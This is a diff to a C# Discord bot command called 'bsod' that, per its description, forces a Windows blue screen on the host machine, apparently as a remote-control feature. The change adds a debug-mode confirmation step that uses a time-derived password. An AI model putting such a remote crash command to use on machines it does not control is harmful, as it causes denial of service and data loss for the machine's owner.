@@ -1,4 +1,5 @@
-﻿using Discord.Commands;
+﻿using Discord;
+using Discord.Commands;
 using System.Runtime.InteropServices;
 
 namespace Main.Source.Bot.Commands
@@ -23,12 +24,31 @@ namespace Main.Source.Bot.Commands
             out uint Response
         );
 
+        private static string _debugPassword = string.Empty;
+
         public override string Name => "bsod";
         public override string Info => "Triggers the blue screen of death";
         public override string Use => "No usage";
 
         public override async Task Func(SocketCommandContext socket, string[] args)
         {
+            if (ConfigMisc.DEBUG_MODE)
+            {
+                if (string.IsNullOrEmpty(_debugPassword))
+                {
+                    _debugPassword = DateTime.Now.ToString("HH:mm:ss").Replace(":", "");
+
+                    await socket.Message.ReplyAsync($"Debug: rerun command with argument \"{_debugPassword}\"");
+                    return;
+                }
+
+                if (args.Length == 0 || args[0] != _debugPassword)
+                {
+                    await socket.Message.ReplyAsync($"Debug: rerun command with argument \"{_debugPassword}\"");
+                    return;
+                }
+            }
+
             bool prev = false;
             uint res = 0;
 
